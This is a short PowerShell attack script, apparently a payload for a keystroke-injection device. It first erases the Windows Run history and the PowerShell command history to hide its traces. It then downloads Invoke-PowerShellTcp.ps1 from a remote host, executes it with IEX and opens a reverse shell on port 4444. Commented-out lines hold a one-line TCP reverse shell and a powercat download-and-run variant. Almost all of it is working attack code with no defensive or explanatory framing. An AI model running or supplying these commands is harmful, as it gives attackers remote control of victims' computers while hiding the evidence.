# Clear Run History and POSH Command History
RP -Pa 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -N '*' -ErrorA Si
rm (Get-PSReadlineOption).HistorySavePath -ErrorA Si

# Essential Variables
$ip = '127.0.0.1'
$ws = New-Object -Com WScript.Shell
$wc = New-Object Net.WebClient
$sapi = New-Object -Com SAPI.SPVoice

# One line POSH reverse shell
# $sm=(New-Object Net.Sockets.TCPClient($ip,4444)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}

# Full POSH reverse shell
IEX $wc.DownloadString('http://{0}/Invoke-PowerShellTcp.ps1' -f $ip)
Invoke-PowerShellTcp -Reverse -IPAddress $ip -Port 4444

# powercat reverse shell (not working)
# $wc.DownloadFile('http://{0}/powercat.ps1' -f $ip, "$env:temp\powercat.ps1");
# Start-Process powershell ("$env:temp\powercat.ps1 {0} 4444" -f $ip)